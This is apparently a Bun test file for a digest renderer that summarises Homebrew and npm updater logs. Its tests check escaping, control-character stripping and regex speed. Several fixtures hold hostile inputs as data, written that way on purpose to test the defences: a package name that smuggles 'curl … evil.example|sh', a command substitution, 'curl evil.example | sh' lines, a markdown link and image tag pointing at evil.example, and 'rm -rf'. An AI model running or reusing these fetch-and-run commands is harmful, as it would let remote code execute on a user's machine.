import { describe, expect, test } from "bun:test";
import { readFileSync } from "node:fs";
import { renderDigest } from "../src/host/digest.ts";
import { summaryLines } from "../src/apply/run-steps.ts";
import { parsePrevSummary } from "../src/host/prev-log.ts";

const QUIET = "=== studio summary ===\n  brew: nothing to update\n  npm:  nothing to update\n";
const digest = (log: string) => renderDigest({ host: "studio", date: "2026-11-03", log });
const section = (text: string, title: string) => text.split(`## ${title}\n`)[1]?.split("\n\n")[0]?.trimEnd() ?? "";
const fixture = (n: string) => readFileSync(new URL(`./fixtures/digest/${n}`, import.meta.url), "utf8");

describe("renderDigest", () => {
  test("golden: an update, a hold and a waiting item", () => {
    const text = renderDigest({ host: "studio", date: "2026-11-03", log: fixture("apply.log") });
    expect(text).toBe(fixture("apply.digest.md"));
  });

  test("a hold carries the reason the log gave, one line", () => {
    const text = renderDigest({ host: "studio", date: "2026-11-03", log: fixture("apply.log") });
    expect(text).toContain("- fancy: tap changed after review (tap HEAD moved 1111111111aa → 2222222222bb)");
  });

  test("a quiet run says nothing needs you", () => {
    const log = "=== studio summary ===\n  brew: nothing to update\n  npm:  nothing to update\n";
    const text = renderDigest({ host: "studio", date: "2026-11-03", log });
    expect(text).toContain("Nothing updated.");
    expect(text).toContain("Nothing is held.");
    expect(text).toContain("Nothing waits on you.");
  });

  test("a whole npm batch held names the reviewer's reason", () => {
    const log = "=== studio summary ===\n  brew: nothing to update\n  npm:  FLAGGED — FLAG: postinstall runs curl | sh\n";
    const text = renderDigest({ host: "studio", date: "2026-11-03", log });
    expect(text).toContain("- npm (whole batch): postinstall runs curl | sh");
  });

  test("terminal control characters in a reason are dropped", () => {
    const log = "x: bad \u001b[31mred‮ reason — FLAG\n[notify] ⚠️ studio Type B FLAG — x\n=== studio summary ===\n  brew: nothing to update\n  npm:  nothing to update\n";
    const text = renderDigest({ host: "studio", date: "2026-11-03", log });
    expect(text).not.toMatch(/[\u001b‮]/);
    expect(text).toContain("bad red reason");
  });

  test("a long reason is cut by code points, never inside a surrogate pair", () => {
    const log = `x: ${"😀".repeat(300)} — FLAG\n[notify] ⚠️ studio Type B FLAG — x\n${QUIET}`;
    const held = renderDigest({ host: "studio", date: "d", log }).split("\n").find((l) => l.startsWith("- x: "))!;
    expect(held).toBe(`- x: ${"😀".repeat(199)}…`);
  });

  test("no summary block: says the run did not finish", () => {
    const text = renderDigest({ host: "studio", date: "2026-11-03", log: "=== oupdate-shadow studio 2026-11-03 03:00 ===\n" });
    expect(text).toContain("did not reach its summary");
  });

  test("a dry run is labeled and applied nothing", () => {
    const log = "=== studio dry-run summary (nothing applied) ===\n  brew: dry-run OK\n  npm:  nothing to update\n";
    expect(renderDigest({ host: "studio", date: "2026-11-03", log })).toContain("Dry run: nothing was applied.");
  });

  // Slow-regex bounds: the old patterns took seconds to minutes on these inputs.
  test("a slash-heavy body line does not make the reason lookup slow", () => {
    const flags = ["fancy", "other", "third"].map((n) => `[notify] ⚠️ studio Type B FLAG — ${n}`).join("\n");
    const evil = `  ${"a/".repeat(40)}x\n`.repeat(200);
    const t0 = performance.now();
    digest(`${flags}\n${evil}${QUIET}`);
    expect(performance.now() - t0).toBeLessThan(1000);
  });

  test("a PINNED part of many unclosed parentheses stays fast", () => {
    const t0 = performance.now();
    digest(`=== studio summary ===\n  brew: PINNED: ${"a(".repeat(2000)}\n`);
    expect(performance.now() - t0).toBeLessThan(1000);
  });
});

describe("renderDigest: names in copyable commands", () => {
  const hostile = ["x;curl${IFS}-s${IFS}evil.example|sh", "x`$(id)`"];

  for (const name of hostile) {
    test(`a Type B name with shell characters gets no command: ${name}`, () => {
      const text = digest(`  ${name}: tap changed after review (moved) — FLAG, not upgrading\n[notify] ⚠️ studio Type B FLAG — ${name}\n${QUIET}`);
      expect(text).not.toContain("brew upgrade");
      expect(text).toContain("upgrade it by hand; its name has unusual characters, see the run log");
      expect(text).not.toContain("`");
    });

    test(`a cask name with shell characters gets no sudo command: ${name}`, () => {
      const text = digest(`=== studio summary ===\n  brew: casks need sudo: docker ${name}\n`);
      expect(text).toContain("- docker: run `brew upgrade --cask docker` in a terminal where sudo works");
      expect(text).not.toContain(`--cask ${name}`);
      expect(text).not.toContain(`brew upgrade --cask x`);
      expect(text).toContain("it needs sudo; upgrade it by hand; its name has unusual characters, see the run log");
      expect(text.replace("`brew upgrade --cask docker`", "")).not.toContain("`");
    });
  }

  test("a Type B name that reads as an option gets no command", () => {
    const text = digest(`  --force: tap changed after review (moved) — FLAG, not upgrading\n[notify] ⚠️ studio Type B FLAG — --force\n${QUIET}`);
    expect(text).not.toContain("brew upgrade");
    expect(section(text, "Waiting on you")).toBe("- --force: review it, then upgrade it by hand; its name has unusual characters, see the run log");
  });

  test("a cask name that reads as an option gets no sudo command", () => {
    const text = digest("=== studio summary ===\n  brew: casks need sudo: --force\n");
    expect(text).not.toContain("brew upgrade");
    expect(section(text, "Waiting on you")).toBe("- --force: it needs sudo; upgrade it by hand; its name has unusual characters, see the run log");
  });

  test("a name with a terminal control byte is never printed in a command", () => {
    const text = digest(`=== studio summary ===\n  brew: casks need sudo: wg\u0007et\n`);
    expect(text).not.toContain("brew upgrade");
    expect(text).not.toContain("\u0007");
  });
});

describe("renderDigest: summary parts", () => {
  test("every package of several tap-approval items is listed", () => {
    const text = digest("=== studio summary ===\n  brew: FLAGGED — awaiting tap approval: one/tap (alpha 1.0→1.1, review: APPROVE (formula-only, prebuilt)); two/tap (beta 2.0→2.1, review: FLAG); (unresolved tap) (gamma 3→4, review: n/a) — approve a tap by adding it to /etc/taps.tsv; nothing approved for upgrade\n");
    expect(section(text, "Held")).toBe("- alpha: its tap one/tap is not approved yet\n- beta: its tap two/tap is not approved yet\n- gamma: its tap could not be resolved");
    expect(section(text, "Waiting on you")).toContain("- beta: add the tap two/tap to the approved-taps file");
    expect(text).not.toContain("unrecognized");
  });

  test("every Gatekeeper note is listed", () => {
    const text = digest("=== studio summary ===\n  brew: casks upgraded: a b; GATEKEEPER pending: a: 2 unapproved; b: 1 unapproved + 1 dylib; STUCK: c=1(4 runs, since 2026-10-01)\n");
    expect(section(text, "Waiting on you")).toBe("- Gatekeeper: a: 2 unapproved\n- Gatekeeper: b: 1 unapproved + 1 dylib\n- c: pending for 4 runs since 2026-10-01; upgrade it by hand or find what blocks it");
  });

  test("a held reason that contains a semicolon is kept whole", () => {
    const text = digest("=== studio summary ===\n  brew: nothing to update\n  npm:  FLAGGED — FLAG: new or changed install script: a; install script runs unreviewed package files: b (structural pre-gate); claude-code: 2.4.0\n");
    expect(text).toContain("- npm (whole batch): new or changed install script: a; install script runs unreviewed package files: b (structural pre-gate)");
    expect(section(text, "Notes")).toBe("- claude-code: 2.4.0 (checked)");
  });

  test("an npm package installed off its reviewed version is reported as installed, not as a held batch", () => {
    const text = digest("=== studio summary ===\n  brew: nothing to update\n  npm:  FLAGGED — left-pad installed 1.4.0, reviewed 1.3.0, chalk installed unknown, reviewed 5.0.0\n");
    expect(text).not.toContain("whole batch");
    expect(section(text, "Waiting on you")).toBe("- left-pad: installed at 1.4.0, but the review covered 1.3.0; read the run log\n- chalk: installed at unknown, but the review covered 5.0.0; read the run log");
  });

  const cases: [string, string, string, string][] = [
    ["a quarantined service", "brew", "svc QUARANTINED — unreviewed install, not restarting (/var/q/svc); upgraded: wget", "svc: an unreviewed install is quarantined and not restarted"],
    ["a failed claude-code update", "npm", "nothing to update; claude-code: FAILED (rc=1, on 2.3.0)", "claude-code: its update failed (rc=1, on 2.3.0)"],
    ["a plain brew flag", "brew", "FLAGGED (see notifications)", "brew: the review held something this run"],
    ["the runtime's own package held", "brew", "upgraded: jq; HELD: bun (runs under it)", "bun: the updater runs under it"],
    ["casks left untried", "brew", "casks deferred: firefox zoom", "zoom: left for the end of the run and not tried"],
    ["a failed stale handoff", "brew", "nothing to update; svc stale — FAILED: /x/waiter missing, nothing will restart it", "svc: still runs an old version; FAILED: /x/waiter missing"],
  ];
  for (const [what, lane, line, expected] of cases) {
    test(`a summary part is reported: ${what}`, () => {
      const text = digest(`=== studio summary ===\n  ${lane}: ${line}\n`);
      expect(text).toContain(expected);
      expect(text).not.toContain("unrecognized");
    });
  }

  test("release-check holds are read per item, not split on every space", () => {
    const text = digest("=== studio summary ===\n  brew: nothing to update; HELD by release check: foo 1.2.3 bar (record unreadable) baz (hold unreadable)\n");
    expect(section(text, "Held")).toBe("- foo: its release check failed on 1.2.3 and it was rolled back; a newer release is tried");
    expect(section(text, "Waiting on you")).toBe(
      "- bar: its release check record is unreadable, so it is held; fix or remove it (see the run log)\n- baz: its release check hold is unreadable, so it is held; fix or remove it (see the run log)",
    );
    expect(text).not.toContain("unrecognized");
  });

  test("claude-code is checked, never listed as updated: the run has no before-version", () => {
    const known = digest("=== studio summary ===\n  brew: nothing to update\n  npm:  nothing to update; claude-code: 2.4.0\n");
    expect(section(known, "Updated")).toBe("Nothing updated.");
    expect(section(known, "Notes")).toBe("- claude-code: 2.4.0 (checked)");
    const unknown = digest("=== studio summary ===\n  brew: nothing to update\n  npm:  nothing to update; claude-code: unknown\n");
    expect(section(unknown, "Notes")).toBe("- claude-code: checked; its version could not be read");
    expect(unknown).not.toContain("unrecognized");
    expect(unknown).toContain("Nothing waits on you.");
  });

  test("stale-keg and linkage notes land where they belong", () => {
    const text = digest(
      "=== studio summary ===\n  brew: upgraded: redis; STALE KEG: postgres(restarted 1, FAILED 1) still running from a deleted keg; restarted onto new keg: redis valkey; STALE KEG: svc handed to waiter (homebrew.mxcl.svc); STALE KEG: pg not handed to waiter (homebrew.mxcl.pg): oupdate is stopping [postgres(3 runs, since 2026-10-30) ]; LINKAGE CHECK FAILED: brew list --formula failed, linkage not checked\n",
    );
    expect(section(text, "Notes")).toBe("- restarted onto the new keg: redis, valkey\n- svc: on a deleted keg, its restart handed to waiter (homebrew.mxcl.svc)");
    expect(section(text, "Waiting on you")).toBe(
      [
        "- postgres: still on a deleted keg for 3 runs since 2026-10-30; restart it by hand",
        "- postgres(restarted 1, FAILED 1): still running from a deleted keg; restart it (see the run log)",
        "- pg: still on a deleted keg and not handed to waiter (homebrew.mxcl.pg): oupdate is stopping; restart it",
        "- LINKAGE CHECK FAILED: brew list --formula failed, linkage not checked; read the run log",
      ].join("\n"),
    );
    expect(text).not.toContain("unrecognized");
  });

  test("a stuck tail on an otherwise empty stale-keg note is still read", () => {
    const text = digest("=== studio summary ===\n  brew: nothing to update; [pg(4 runs, since 2026-10-29) ]\n");
    expect(section(text, "Waiting on you")).toBe("- pg: still on a deleted keg for 4 runs since 2026-10-29; restart it by hand");
  });

  test("services on hold or deferred after an upgrade show as held, with the reason", () => {
    const text = digest("=== studio summary ===\n  brew: upgraded: redis svc other pg; restarted: redis(sys) svc(on hold, not restarted) other(deferred to idle waiter) pg(FAILED to restart)\n");
    expect(section(text, "Held")).toBe("- svc: on hold, not restarted\n- other: not restarted (deferred to idle waiter)");
    expect(section(text, "Waiting on you")).toBe("- pg: its restart failed (FAILED to restart); restart it by hand");
    expect(section(text, "Notes")).toBe("- restarted: redis");
  });

  test("a Type B flag plus the core's plain FLAGGED gives no second, generic line", () => {
    const text = digest(`  fancy: tap changed after review (moved) — FLAG, not upgrading\n[notify] ⚠️ studio Type B FLAG — fancy\n=== studio summary ===\n  brew: FLAGGED (see notifications); notify: not configured — notices were logged only\n`);
    expect(section(text, "Waiting on you")).toBe("- fancy: review it, then upgrade it yourself with `brew upgrade fancy`");
  });

  test("markdown link and tag openers from the log are escaped", () => {
    const text = digest("=== studio summary ===\n  brew: BRAND NEW see [x](http://evil.example) <img src=x>\n");
    expect(text).not.toContain("](http");
    expect(text).not.toMatch(/(^|[^\\])<img/);
    expect(text).toContain("[x]\\(http://evil.example) \\<img src=x>");
  });

  test("an app-bundle review flag is held once and gets no brew command", () => {
    const text = digest(
      "  myapp (app bundle): review aborted before a verdict: FLAG\n  myapp: review FLAG: new network step\n[notify] ⚠️ studio Type B FLAG — myapp (app bundle)\n=== studio summary ===\n  brew: FLAGGED (see notifications); myapp held: review FLAG\n",
    );
    expect(text).not.toContain("brew upgrade");
    expect(section(text, "Held")).toBe("- myapp: review FLAG: new network step");
    expect(section(text, "Waiting on you")).toBe("- myapp: review its release, then update the app by hand");
  });

  test("a HEAD install flag gives the command that fetches HEAD", () => {
    const text = digest(`  tool: HEAD install: its review is not in this oupdate version — FLAG, not upgrading\n[notify] ⚠️ studio Type B FLAG — tool (HEAD)\n${QUIET}`);
    expect(section(text, "Waiting on you")).toBe("- tool: review it, then upgrade it yourself with `brew upgrade --fetch-HEAD tool`");
  });

  test("a failed release check waits on you; a passed one is a note", () => {
    const failed = digest("=== studio summary ===\n  brew: nothing to update; release check: foo 2.0 FAIL, rolled back to 1.9 (held, 1.9 PASS)\n");
    expect(section(failed, "Waiting on you")).toBe("- release check: foo 2.0 FAIL, rolled back to 1.9 (held, 1.9 PASS); read the run log");
    expect(failed).not.toContain("## Notes");
    const broken = digest("=== studio summary ===\n  brew: nothing to update; release check: foo 2.0 check could not run (timeout), kept\n");
    expect(section(broken, "Waiting on you")).toContain("- release check: foo 2.0 check could not run (timeout), kept");
    const passed = digest("=== studio summary ===\n  brew: nothing to update; release check: bar 1.1 PASS\n");
    expect(section(passed, "Notes")).toBe("- release check: bar 1.1 PASS");
    expect(passed).toContain("Nothing waits on you.");
  });

  test("release-check notes are sorted one by one", () => {
    const text = digest("=== studio summary ===\n  brew: nothing to update; release check: foo 2.0 FAIL, rolled back to 1.9 (held), 1.9 FAIL, after not run, bar 1.1 PASS, baz not upgraded, candidate unreadable, qux waits for foo\n");
    expect(section(text, "Waiting on you")).toBe(
      "- release check: foo 2.0 FAIL, rolled back to 1.9 (held), 1.9 FAIL, after not run; read the run log\n- release check: baz not upgraded, candidate unreadable; read the run log",
    );
    expect(section(text, "Notes")).toBe("- release check: bar 1.1 PASS\n- release check: qux waits for foo");
  });

  test("a failed release check already named by FAILED waits once", () => {
    const text = digest("=== studio summary ===\n  brew: FAILED: release-check:foo; nothing to update; release check: foo 2.0 FAIL, rolled back to 1.9 (held, 1.9 PASS), bar 1.1 PASS\n");
    expect(section(text, "Waiting on you")).toBe("- release-check:foo: the upgrade failed; read the run log");
    expect(section(text, "Notes")).toBe("- release check: bar 1.1 PASS");
  });

  test("a release check error waits on you, once", () => {
    const alone = digest("=== studio summary ===\n  brew: nothing to update; release check: foo release check error\n");
    expect(section(alone, "Waiting on you")).toBe("- release check: foo release check error; read the run log");
    const named = digest("=== studio summary ===\n  brew: FAILED: release-check:foo; nothing to update; release check: foo release check error\n");
    expect(section(named, "Waiting on you")).toBe("- release-check:foo: the upgrade failed; read the run log");
  });

  test("a run aborted after its summary is not read as clean", () => {
    const text = digest(`${QUIET}  mas:  not checked — the App Store phase is not in oupdate\n=== ABORTED: oupdate-shadow on studio got SIGTERM — this run did NOT complete ===\n`);
    expect(section(text, "Waiting on you")).toBe("- the run was stopped and did not complete; read the run log");
  });

  test("a run aborted before its summary is not read as clean", () => {
    const text = digest(`=== ABORTED: oupdate-shadow on studio got SIGTERM — this run did NOT complete ===\n${QUIET}`);
    expect(section(text, "Waiting on you")).toBe("- the run was stopped and did not complete; read the run log");
  });

  test("every lane line of the block is read: a hold in either of two brew lines shows", () => {
    for (const lines of [["FLAGGED — FLAG: postinstall runs curl | sh", "nothing to update"], ["nothing to update", "FLAGGED — FLAG: postinstall runs curl | sh"]]) {
      const text = digest(`=== studio summary ===\n${lines.map((l) => `  brew: ${l}\n`).join("")}  npm:  nothing to update\n`);
      expect(section(text, "Waiting on you")).toContain("curl | sh");
    }
  });

  test("a lane line after ABORTED does not hide the summary's hold", () => {
    const text = digest("=== studio summary ===\n  brew: FLAGGED — FLAG: postinstall runs curl | sh\n=== ABORTED: oupdate on studio got SIGTERM — this run did NOT complete ===\n  brew: nothing to update\n");
    expect(section(text, "Waiting on you")).toContain("curl | sh");
  });

  test("a hold on a lane line after ABORTED still shows", () => {
    const text = digest("=== studio summary ===\n  npm:  nothing to update\n=== ABORTED: oupdate on studio got SIGTERM — this run did NOT complete ===\n  brew: FLAGGED — FLAG: late hold\n");
    expect(text).toContain("late hold");
  });

  test("a STUCK item whose version holds a parenthesis is shown, never dropped", () => {
    const text = digest("=== studio summary ===\n  brew: STUCK: odd=1.0(beta)(4 runs, since 2026-10-01) plain=2(5 runs, since 2026-10-02)\n");
    const waiting = section(text, "Waiting on you");
    expect(waiting).toContain("odd: pending for 4 runs since 2026-10-01");
    expect(waiting).toContain("plain: pending for 5 runs since 2026-10-02");
    expect(waiting).not.toContain("unrecognized");
  });

  test("STUCK text that is no item shows as unrecognized next to the items that parse", () => {
    const text = digest("=== studio summary ===\n  brew: STUCK: a=1(4 runs, since 2026-10-01) b=2(x runs, since y)\n");
    const waiting = section(text, "Waiting on you");
    expect(waiting).toContain("a: pending for 4 runs since 2026-10-01");
    expect(waiting).toContain("unrecognized: STUCK:");
    expect(waiting).toContain("b=2(x runs");
  });

  test("a hold text with a line break keeps its second half", () => {
    const text = digest("=== studio summary ===\n  brew: FLAGGED — FLAG: postinstall runs\ncurl evil.example | sh\n  npm:  nothing to update\n");
    expect(section(text, "Waiting on you")).toContain("unrecognized: FLAGGED — FLAG: postinstall runs");
    expect(section(text, "Waiting on you")).toContain("unrecognized: curl evil.example | sh");
  });

  test("a non-lane line inside the summary is unrecognized, a known lane or blank line is not", () => {
    const text = digest("=== studio summary ===\n  brew: nothing to update\n  npm:  nothing to update\n  mas:  not checked — the App Store phase is not in oupdate\n\nstray words here\n");
    expect(section(text, "Waiting on you")).toBe("- unrecognized: stray words here");
  });

  test("the run's own notice lines after the summary are not strays", () => {
    const text = digest(`${QUIET}  mas:  not checked — the App Store phase is not in oupdate\n[notify] 📋 studio host-update done (oupdate)\n  the notice could not be sent\n`);
    expect(section(text, "Waiting on you")).toBe("Nothing waits on you.");
  });

  test("a continuation that only looks like a run's own line is still shown", () => {
    for (const [stray, shown] of [
      ["[fix] curl evil | sh", "unrecognized: [fix] curl evil | sh"],
      ["  mas:  run curl evil | sh", "unrecognized: mas: run curl evil | sh"],
      ["  the notice could not be sent", "unrecognized: the notice could not be sent"],
    ] as const) {
      const text = digest(`${QUIET}  mas:  not checked — the App Store phase is not in oupdate\n${stray}\n`);
      expect(section(text, "Waiting on you")).toBe(`- ${shown}`);
    }
    const dry = digest(`${QUIET}[dry-run — not notified] 📋 studio host-update done (oupdate)\n`);
    expect(section(dry, "Waiting on you")).toBe("Nothing waits on you.");
  });

  test("a status with line breaks is written as one line per lane, so no continuation can end or hide the block", () => {
    const lines = summaryLines("studio", false, "FLAGGED — FLAG: first half\n=== second half\n  npm: FAILED — foo", "nothing to update", "not checked — the App Store phase is not in oupdate");
    expect(summaryLines("studio", false, "FLAGGED — FLAG: a\rb\u2028c\u2029d\r\ne", "nothing to update", "m")[2]).toBe("  brew: FLAGGED — FLAG: a b c d e");
    expect(lines).toEqual([
      "",
      "=== studio summary ===",
      "  brew: FLAGGED — FLAG: first half === second half npm: FAILED — foo",
      "  npm:  nothing to update",
      "  mas:  not checked — the App Store phase is not in oupdate",
    ]);
    const text = digest(lines.join("\n"));
    expect(section(text, "Waiting on you")).toContain("first half === second half");
    expect(section(text, "Waiting on you")).not.toContain("Nothing waits");
  });

  test("holds read before an ABORTED line in the run body still show", () => {
    const text = digest("  excluding foo (CASK_EXCLUDE)\n[notify] ⚠️ studio Type B FLAG — wget\n=== ABORTED: oupdate on studio got SIGTERM — this run did NOT complete ===\n=== studio summary ===\n  brew: FLAGGED (see notifications)\n  npm:  nothing to update\n");
    expect(section(text, "Held")).toContain("foo: excluded in your config");
    expect(section(text, "Held")).toContain("wget:");
    expect(section(text, "Waiting on you")).toContain("the run was stopped");
  });

  test("a release-check note that starts with spaces or a colon does not crash the digest", () => {
    expect(() => digest("=== studio summary ===\n  brew: nothing to update; release check:  foo FAIL\n")).not.toThrow();
    expect(() => digest("=== studio summary ===\n  brew: nothing to update; release check: : FAIL\n")).not.toThrow();
  });

  test("reviewer text quoting a Type B notice does not hide a formula hold", () => {
    const text = digest("  wget: review FLAG: says [notify] ⚠️ studio Type B FLAG — wget (app bundle)\n[notify] ⚠️ studio Type B FLAG — wget\n=== studio summary ===\n  brew: FLAGGED (see notifications)\n  npm:  nothing to update\n");
    expect(section(text, "Waiting on you")).toContain("`brew upgrade wget`");
  });

  test("an app hold reason that contains a semicolon is kept whole", () => {
    const text = digest("=== studio summary ===\n  brew: nothing approved for upgrade; myapp held: release surface — manual review: a.sh: binary file added or changed; b.yml: new workflow step\n");
    expect(section(text, "Held")).toBe("- myapp: release surface — manual review: a.sh: binary file added or changed; b.yml: new workflow step");
    expect(text).not.toContain("unrecognized");
  });

  test("a part after an app hold that is no finding shows as unrecognized", () => {
    const text = digest("=== studio summary ===\n  brew: nothing approved for upgrade; myapp held: tag v2 is not in the project's source; BRAND NEW writer part\n");
    expect(section(text, "Held")).toBe("- myapp: tag v2 is not in the project's source");
    expect(section(text, "Waiting on you")).toBe("- unrecognized: BRAND NEW writer part");
  });

  test("tap-approval text that is not a tap item is shown, never dropped", () => {
    const text = digest("=== studio summary ===\n  brew: FLAGGED — awaiting tap approval: garbage; one/tap (alpha 1.0→1.1, review: n/a) — approve a tap by adding it to taps.tsv; odd (thing here)\n");
    expect(section(text, "Held")).toBe("- alpha: its tap one/tap is not approved yet");
    expect(section(text, "Waiting on you")).toBe(
      "- unrecognized: garbage\n- alpha: add the tap one/tap to the approved-taps file to let the next run review it\n- unrecognized: odd (thing here)",
    );
  });

  // Linear takes milliseconds here; the old quadratic pattern took several seconds.
  test("a STUCK part of many unclosed entries stays fast", () => {
    const t0 = performance.now();
    digest(`=== studio summary ===\n  brew: STUCK: ${"a=1(1 runs, since x".repeat(20000)}\n`);
    expect(performance.now() - t0).toBeLessThan(2500);
  }, 30_000);

  test("an unrecognized part waits on you, cleaned, one line and capped", () => {
    const text = digest(`=== studio summary ===\n  brew: upgraded: wget; BRAND NEW thing \u001b[31m\`rm -rf\`‮ ${"z".repeat(400)}\n`);
    const w = section(text, "Waiting on you");
    expect(w.startsWith("- unrecognized: BRAND NEW thing 'rm -rf' zzz")).toBe(true);
    expect(w).not.toMatch(/[\u001b‮`]/);
    expect([...w].length).toBeLessThan(240);
    expect(text).not.toContain("Nothing waits on you.");
  });
});


describe("the shadow report reads the same run log", () => {
  test("an app-bundle flag is not counted as a flagged formula", () => {
    const log = "=== oupdate-shadow studio 2026-11-03 03:00 ===\n[notify] ⚠️ studio Type B FLAG — myapp (app bundle)\n[notify] ⚠️ studio Type B FLAG — tool (HEAD)\n=== studio summary ===\n  brew: FLAGGED (see notifications); myapp held: review FLAG\n";
    const s = parsePrevSummary(log, "studio", "shadow")!;
    expect(s.date).toBe("2026-11-03");
    expect(s.brew.flagged).toEqual(["tool"]);
  });

  test("another host's run header inside the body does not end the scan", () => {
    const log = "=== oupdate-shadow studio 2026-11-02 03:00 ===\n[notify] ⚠️ studio Type B FLAG — wget\n=== oupdate-shadow other 2026-11-03 03:00 ===\n=== studio summary ===\n  brew: FLAGGED (see notifications)\n";
    const s = parsePrevSummary(log, "studio", "shadow")!;
    expect(s.date).toBe("2026-11-02");
    expect(s.brew.flagged).toEqual(["wget"]);
  });
});
